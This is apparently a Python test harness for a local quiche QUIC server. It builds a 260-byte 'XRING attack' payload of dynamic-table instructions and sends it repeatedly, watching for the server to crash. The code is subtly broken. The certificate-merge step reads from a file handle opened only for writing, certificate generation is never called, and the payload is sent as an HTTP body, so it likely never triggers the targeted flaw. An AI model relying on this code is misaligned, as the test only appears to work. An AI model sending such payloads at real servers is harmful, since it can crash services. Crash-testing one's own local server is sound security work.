#!/usr/bin/env python3
"""
QUIC XRING Dynamic Test Harness
Tests XQUIC-like attack using cloudflare-quiche
"""

import subprocess
import sys
import os
import json
import tempfile
import signal
import threading
import time
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import Optional, Dict, List
from datetime import datetime

# Configuration
QUICTE_SERVER = "/opt/homebrew/bin/quiche-server"
QUICTE_CLIENT = "/opt/homebrew/bin/quiche-client"
TEMP_DIR = tempfile.mkdtemp(prefix="quic_xring_test_")
CERT_DIR = f"{TEMP_DIR}/certs"
LOG_DIR = f"{TEMP_DIR}/logs"
PAYLOAD_FILE = f"{TEMP_DIR}/xring_payload.bin"
SERVER_PORT = 4433
SERVER_HOST = "127.0.0.1"

@dataclass
class TestResult:
    timestamp: str
    test_name: str
    status: str
    details: Dict
    crash_detected: bool = False
    signal: Optional[str] = None

    def to_dict(self):
        return asdict(self)

class CertManager:
    @staticmethod
    def generate_certs(cert_dir: str):
        """Generate self-signed certificates for testing"""
        os.makedirs(cert_dir, exist_ok=True)
        
        # Generate CA
        subprocess.run([
            "openssl", "genrsa", "-out", f"{cert_dir}/ca.key", "2048"
        ], capture_output=True)
        
        subprocess.run([
            "openssl", "req", "-new", "-x509",
            "-key", f"{cert_dir}/ca.key",
            "-out", f"{cert_dir}/ca.crt",
            "-days", "365",
            "-subj", "/CN=QuicXRingTest CA"
        ], capture_output=True)
        
        # Generate server cert
        subprocess.run([
            "openssl", "genrsa", "-out", f"{cert_dir}/server.key", "2048"
        ], capture_output=True)
        
        subprocess.run([
            "openssl", "req", "-new", "-key", f"{cert_dir}/server.key",
            "-out", f"{cert_dir}/server.csr",
            "-subj", "/CN=localhost"
        ], capture_output=True)
        
        subprocess.run([
            "openssl", "x509", "-req",
            "-in", f"{cert_dir}/server.csr",
            "-CA", f"{cert_dir}/ca.crt",
            "-CAkey", f"{cert_dir}/ca.key",
            "-CAcreateserial",
            "-out", f"{cert_dir}/server.crt",
            "-days", "365"
        ], capture_output=True)
        
        # Combine cert and key
        with open(f"{cert_dir}/server.pem", "wb") as cert_f, \
             open(f"{cert_dir}/server.key", "rb") as key_f:
            cert_f.write(cert_f.read())
            cert_f.write(key_f.read())
        
        return f"{cert_dir}/server.pem"

class PayloadGenerator:
    @staticmethod
    def generate_xring_payload() -> bytes:
        """Generate 260-byte XRING attack payload"""
        payload = bytearray()
        
        # SET_DYNAMIC_TABLE_CAPACITY = 64
        payload.extend([0x20, 0x40])
        
        # 61 INSERT operations (4 bytes each)
        for _ in range(61):
            payload.extend([0x40, 1, ord('x'), 0])
        
        # One larger INSERT (13 bytes)
        payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 
                       5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])
        
        # SET_DYNAMIC_TABLE_CAPACITY = 65
        payload.extend([0x20, 0x41])
        
        # Trim to exactly 260 bytes
        payload = payload[:260]
        
        return bytes(payload)
    
    @staticmethod
    def save_payload(payload: bytes, filepath: str):
        """Save payload to file"""
        with open(filepath, "wb") as f:
            f.write(payload)

class QUICTestHarness:
    def __init__(self):
        self.server_process = None
        self.client_process = None
        self.results: List[TestResult] = []
    
    def start_server(self) -> bool:
        """Start quiche-server"""
        print(f"Starting quiche-server on {SERVER_HOST}:{SERVER_PORT}")
        
        cert_path = f"{CERT_DIR}/server.pem"
        
        try:
            self.server_process = subprocess.Popen(
                [
                    QUICTE_SERVER,
                    f"--listen={SERVER_HOST}:{SERVER_PORT}",
                    f"--cert={cert_path}",
                    f"--root={CERT_DIR}",
                    "--dgram-count=0",
                    "--no-verify",
                    "--dump-packets"
                ],
                env={**os.environ, "RUST_LOG": "info"},
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=TEMP_DIR
            )
            
            # Wait for server to be ready
            time.sleep(3)
            
            if self.server_process.poll() is None:
                print("✅ Server started successfully")
                return True
            else:
                print("❌ Server failed to start")
                return False
                
        except Exception as e:
            print(f"❌ Error starting server: {e}")
            return False
    
    def stop_server(self):
        """Stop quiche-server"""
        if self.server_process:
            self.server_process.terminate()
            try:
                self.server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_process.kill()
            self.server_process = None
            print("Server stopped")
    
    def send_payload(self, body_file: Optional[str] = None) -> int:
        """Send payload via quiche-client"""
        print(f"Sending payload via quiche-client...")
        
        cmd = [
            QUICTE_CLIENT,
            f"--trust-origin-ca-pem={CERT_DIR}/ca.crt",
            "--no-verify",
            f"https://{SERVER_HOST}:{SERVER_PORT}/test"
        ]
        
        if body_file and os.path.exists(body_file):
            cmd.extend(["--body", body_file])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            print(f"Client exit code: {result.returncode}")
            if result.stdout:
                print("STDOUT:", result.stdout[:500])
            if result.stderr:
                print("STDERR:", result.stderr[:500])
            
            return result.returncode
            
        except subprocess.TimeoutExpired:
            if self.client_process:
                self.client_process.kill()
            return -1
        except Exception as e:
            print(f"❌ Error sending payload: {e}")
            return -1
    
    def test_basic_connectivity(self) -> TestResult:
        """Test 1: Basic QUIC connectivity"""
        print("\n=== Test 1: Basic Connectivity ===")
        
        start_time = time.time()
        
        if not self.start_server():
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="basic_connectivity",
                status="failed",
                details={"error": "Server failed to start"},
                crash_detected=False
            )
        
        try:
            # Send simple GET request
            result = subprocess.run(
                [
                    QUICTE_CLIENT,
                    f"--trust-origin-ca-pem={CERT_DIR}/ca.crt",
                    "--no-verify",
                    f"https://{SERVER_HOST}:{SERVER_PORT}/"
                ],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            response_time = (time.time() - start_time) * 1000
            
            if result.returncode == 0 and "200" in result.stdout:
                print("✅ Basic connectivity test PASSED")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="basic_connectivity",
                    status="passed",
                    details={
                        "response_time_ms": round(response_time, 2),
                        "status_code": "200"
                    },
                    crash_detected=False
                )
            else:
                print("❌ Basic connectivity test FAILED")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="basic_connectivity",
                    status="failed",
                    details={
                        "response_time_ms": round(response_time, 2),
                        "error": result.stderr[:500],
                        "exit_code": result.returncode
                    },
                    crash_detected=False
                )
                
        except Exception as e:
            self.stop_server()
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="basic_connectivity",
                status="error",
                details={"error": str(e)},
                crash_detected=False
            )
    
    def test_payload_transmission(self) -> TestResult:
        """Test 2: XRING payload transmission"""
        print("\n=== Test 2: XRING Payload Transmission ===")
        
        start_time = time.time()
        
        if not self.start_server():
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="payload_transmission",
                status="failed",
                details={"error": "Server failed to start"},
                crash_detected=False
            )
        
        # Generate and save payload
        payload = PayloadGenerator.generate_xring_payload()
        PayloadGenerator.save_payload(payload, PAYLOAD_FILE)
        
        try:
            # Send payload via file upload
            result = subprocess.run(
                [
                    QUICTE_CLIENT,
                    f"--trust-origin-ca-pem={CERT_DIR}/ca.crt",
                    "--no-verify",
                    "--body", PAYLOAD_FILE,
                    f"https://{SERVER_HOST}:{SERVER_PORT}/upload"
                ],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            response_time = (time.time() - start_time) * 1000
            
            # Check if server is still running
            server_still_alive = self.server_process and self.server_process.poll() is None
            
            if result.returncode == 0:
                print("✅ Payload transmission test PASSED (no crash)")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="payload_transmission",
                    status="passed",
                    details={
                        "response_time_ms": round(response_time, 2),
                        "server_still_running": server_still_alive,
                        "payload_size": len(payload),
                        "exit_code": result.returncode
                    },
                    crash_detected=False
                )
            else:
                print(f"❌ Payload transmission test FAILED (exit {result.returncode})")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="payload_transmission",
                    status="failed",
                    details={
                        "response_time_ms": round(response_time, 2),
                        "server_still_running": server_still_alive,
                        "payload_size": len(payload),
                        "error": result.stderr[:500],
                        "exit_code": result.returncode
                    },
                    crash_detected=False
                )
                
        except subprocess.TimeoutExpired:
            print("❌ Payload transmission timed out")
            self.stop_server()
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="payload_transmission",
                status="error",
                details={"error": "Timeout"},
                crash_detected=True,
                signal="TIMEOUT"
            )
        except Exception as e:
            self.stop_server()
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="payload_transmission",
                status="error",
                details={"error": str(e)},
                crash_detected=False
            )
    
    def test_memory_monitoring(self) -> TestResult:
        """Test 3: Memory monitoring and stability"""
        print("\n=== Test 3: Memory Monitoring ===")
        
        start_time = time.time()
        
        if not self.start_server():
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="memory_monitoring",
                status="failed",
                details={"error": "Server failed to start"},
                crash_detected=False
            )
        
        try:
            # Send payload multiple times
            for i in range(3):
                result = subprocess.run(
                    [
                        QUICTE_CLIENT,
                        f"--trust-origin-ca-pem={CERT_DIR}/ca.crt",
                        "--no-verify",
                        "--body", PAYLOAD_FILE,
                        f"https://{SERVER_HOST}:{SERVER_PORT}/test"
                    ],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                print(f"Attempt {i+1}: exit code {result.returncode}")
            
            # Check server stability
            server_still_alive = self.server_process and self.server_process.poll() is None
            
            response_time = (time.time() - start_time) * 1000
            
            if server_still_alive:
                print("✅ Server remained stable after multiple payload attempts")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="memory_monitoring",
                    status="passed",
                    details={
                        "response_time_ms": round(response_time, 2),
                        "server_still_running": True,
                        "attempts": 3
                    },
                    crash_detected=False
                )
            else:
                print("❌ Server crashed during memory monitoring")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="memory_monitoring",
                    status="failed",
                    details={
                        "response_time_ms": round(response_time, 2),
                        "server_still_running": False,
                        "attempts": 3
                    },
                    crash_detected=True
                )
                
        except Exception as e:
            self.stop_server()
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="memory_monitoring",
                status="error",
                details={"error": str(e)},
                crash_detected=False
            )
    
    def run_test_suite(self) -> Dict:
        """Run all tests and return summary"""
        print("=" * 60)
        print("QUIC XRING DYNAMIC TEST SUITE")
        print("=" * 60)
        
        tests = [
            self.test_basic_connectivity,
            self.test_payload_transmission,
            self.test_memory_monitoring
        ]
        
        results = []
        passed = 0
        failed = 0
        errors = 0
        
        for test in tests:
            try:
                result = test()
                results.append(result)
                
                if result.status == "passed":
                    passed += 1
                elif result.status == "failed":
                    failed += 1
                else:
                    errors += 1
                    
            except Exception as e:
                error_result = TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name=test.__name__,
                    status="error",
                    details={"error": str(e)},
                    crash_detected=False
                )
                results.append(error_result)
                errors += 1
        
        # Save results
        results_file = f"{TEMP_DIR}/test_results.json"
        with open(results_file, "w") as f:
            json.dump([r.to_dict() for r in results], f, indent=2)
        
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        print(f"✅ Passed: {passed}")
        print(f"❌ Failed: {failed}")
        print(f"⚠️ Errors: {errors}")
        print(f"📄 Results saved to: {results_file}")
        
        return {
            "total_tests": len(tests),
            "passed": passed,
            "failed": failed,
            "errors": errors,
            "results": results
        }

if __name__ == "__main__":
    harness = QUICTestHarness()
    summary = harness.run_test_suite()
    
    sys.exit(0 if summary["failed"] == 0 else 1)
